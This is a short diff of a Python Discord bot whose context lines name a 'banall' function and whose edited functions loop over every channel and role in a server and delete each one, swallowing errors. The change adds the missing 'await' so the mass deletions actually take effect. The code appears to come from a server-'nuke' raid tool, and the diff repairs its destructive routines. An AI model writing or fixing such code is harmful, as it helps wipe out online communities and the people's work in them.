@@ -26,14 +26,14 @@ async def banall(ctx):
 async def clearch(ctx):
 	for channel in ctx.guild.channels:
 		try:
-			channel.delete()
+			await channel.delete()
 		except:
 			continue
 
 async def clearrl(ctx):
 	for role in ctx.guild.roles:
 		try:
-			role.delete()
+			await role.delete()
 		except:
 			continue
 
